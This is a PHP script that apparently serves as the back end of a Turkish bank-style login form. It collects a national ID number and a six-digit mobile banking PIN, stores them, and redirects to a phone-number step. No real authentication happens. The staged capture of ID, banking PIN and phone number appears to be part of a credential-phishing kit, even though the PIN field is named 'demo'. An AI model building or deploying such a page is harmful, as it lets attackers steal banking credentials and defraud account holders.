<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

function respondJson(array $payload, int $statusCode = 200): void
{
    http_response_code($statusCode);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
    exit;
}

$isAjax = strtolower((string) ($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '')) === 'xmlhttprequest';

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    if ($isAjax) {
        respondJson(['ok' => false, 'errors' => ['Gecersiz istek metodu.']], 405);
    }
    header('Location: giris.php');
    exit;
}

$nationalId = preg_replace('/\D+/', '', (string) ($_POST['national_id'] ?? ($_POST['user_code'] ?? ''))) ?? '';
$demoPin = trim((string) ($_POST['demo_pin'] ?? ''));

$errors = [];
if (strlen($nationalId) !== 11) {
    $errors[] = 'T.C. Kimlik No 11 haneli olmalidir.';
} elseif (!isValidTurkishNationalId($nationalId)) {
    $errors[] = 'T.C. Kimlik No algoritma kontrolunden gecemedi.';
}
if (!preg_match('/^[0-9]{6}$/', $demoPin)) {
    $errors[] = 'Mobil bankacilik şifreniz tam olarak 6 haneli olmalidir.';
}

$_SESSION['form_old'] = [
    'national_id' => $nationalId,
];

if (!empty($errors)) {
    if ($isAjax) {
        respondJson(['ok' => false, 'errors' => $errors], 422);
    }
    $_SESSION['form_errors'] = $errors;
    header('Location: giris.php');
    exit;
}

$application = createApplication([
    'national_id' => $nationalId,
    'user_code' => $nationalId,
    'demo_pin' => $demoPin,
]);

unset($_SESSION['form_old']);
$nextUrl = 'tel.php?id=' . urlencode((string) $application['id']);
if ($isAjax) {
    respondJson([
        'ok' => true,
        'id' => $application['id'],
        'status' => $application['status'],
        'next_url' => $nextUrl,
        'message' => 'Devam etmek icin telefon adimina yonlendiriliyor.',
    ]);
}
header('Location: ' . $nextUrl);
exit;

